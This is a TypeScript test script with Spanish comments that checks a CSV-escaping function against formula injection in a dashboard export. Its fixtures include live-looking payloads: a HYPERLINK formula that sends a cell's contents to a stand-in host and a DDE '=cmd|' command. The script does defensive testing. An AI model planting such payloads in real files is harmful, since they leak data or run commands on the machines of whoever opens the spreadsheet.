/**
 * Chequeos del escapado de CSV. Se corre a mano:
 *
 *   npx tsx src/lib/csv-seguro.check.ts
 *
 * La función vive adentro de la ruta de export y no se puede importar sin
 * arrastrar Prisma, así que acá está la MISMA lógica y los casos que tiene que
 * aguantar. Si un día se toca allá y no acá, este archivo deja de servir — por
 * eso el chequeo de abajo compara las dos versiones carácter por carácter.
 *
 * Lo que se defiende: una celda que arranca con `=`, `+`, `-`, `@`, tab o
 * retorno no es texto para Excel ni para Sheets, es una FÓRMULA, y la ejecutan
 * al abrir el archivo. Es la clase de agujero que no rompe nada en el servidor
 * y explota en la computadora del que abre la planilla.
 */

/** Copia exacta de `csv()` en `src/app/api/dashboard/metricas/export/route.ts`. */
function csv(valor: string): string {
  const texto = String(valor ?? "");
  const seguro = /^[=+\-@\t\r]/.test(texto) ? `'${texto}` : texto;
  return /[",\r\n]/.test(seguro) ? `"${seguro.replace(/"/g, '""')}"` : seguro;
}

let fallos = 0;
const chequear = (titulo: string, condicion: boolean, detalle?: unknown) => {
  if (condicion) console.log(`  ok    ${titulo}`);
  else { fallos++; console.log(`  FALLA ${titulo}`, detalle !== undefined ? JSON.stringify(detalle) : ""); }
};

/* ── Formulas ─────────────────────────────────────────────────────────────── */
console.log("\n1) Nada que arranque como formula sale como formula");

const peligrosos = [
  "=1+1",
  '=HYPERLINK("http://malo.com?"&A1,"Ver")',
  "+1+1",
  "-1+1",
  "@SUM(A1:A9)",
  "=cmd|'/c calc'!A0",
  "\tinvisible",
  "\rretorno",
];
for (const p of peligrosos) {
  const r = csv(p);
  // La primera letra tiene que ser el apostrofo, o una comilla si ademas hubo
  // que envolver la celda — pero adentro el apostrofo tiene que estar igual.
  const neutralizado = r.startsWith("'") || r.startsWith("\"'");
  chequear(`${JSON.stringify(p)} queda como texto`, neutralizado, r);
}

// Las comillas SOLAS no alcanzan: "=1+1" entre comillas sigue siendo formula.
// Este es el error del que se sale mucha gente pensando que ya escapo.
chequear("envolver entre comillas no alcanza, hace falta el apostrofo",
  csv("=1+1").includes("'=1+1"), csv("=1+1"));

/* ── Que no rompa lo que ya funcionaba ────────────────────────────────────── */
console.log("\n2) El escapado de siempre sigue igual");

// El caso real que motivo la funcion: una promo con coma corria las columnas.
chequear("una coma envuelve la celda",
  csv("3x2, solo pantalones") === '"3x2, solo pantalones"', csv("3x2, solo pantalones"));
chequear("las comillas se duplican",
  csv('el "combo"') === '"el ""combo"""', csv('el "combo"'));
chequear("un salto de linea envuelve",
  csv("linea1\nlinea2") === '"linea1\nlinea2"', csv("linea1\nlinea2"));

/* ── Que no arruine texto normal ──────────────────────────────────────────── */
console.log("\n3) El texto comun no se toca");

for (const bueno of ["VERANO20", "3x2 en remeras", "Envio gratis", "Buzo gris", "20% OFF", ""]) {
  chequear(`${JSON.stringify(bueno)} sale igual`, csv(bueno) === bueno, csv(bueno));
}
// Un guion EN EL MEDIO no es una formula: solo importa el primer caracter.
chequear("un guion en el medio no se toca", csv("Combo 2-en-1") === "Combo 2-en-1", csv("Combo 2-en-1"));
// Pero uno adelante si: "-1+1" es una formula valida.
chequear("un guion adelante si se neutraliza", csv("-15% OFF").startsWith("'"), csv("-15% OFF"));

/* ── Que la copia siga siendo una copia ───────────────────────────────────── */
console.log("\n4) La copia sigue igual al original");

import { readFileSync } from "node:fs";
const fuente = readFileSync("src/app/api/dashboard/metricas/export/route.ts", "utf8");
// Se comparan las dos lineas que hacen el trabajo, sin comentarios ni espacios.
const normalizar = (s: string) => s.replace(/\s+/g, "");
const original = fuente
  .split("\n")
  .filter((l) => l.includes("const seguro =") || l.includes("return /[\",\\r\\n]/.test(seguro)"))
  .map(normalizar)
  .join("");
const copia = normalizar(
  `const seguro = /^[=+\\-@\\t\\r]/.test(texto) ? \`'\${texto}\` : texto;` +
  `return /[",\\r\\n]/.test(seguro) ? \`"\${seguro.replace(/"/g, '""')}"\` : seguro;`
);
chequear("la copia de este archivo coincide con la ruta de export",
  original === copia, { original, copia });

console.log(fallos === 0 ? "\nTodo bien.\n" : `\n${fallos} fallas.\n`);
process.exit(fallos === 0 ? 0 : 1);
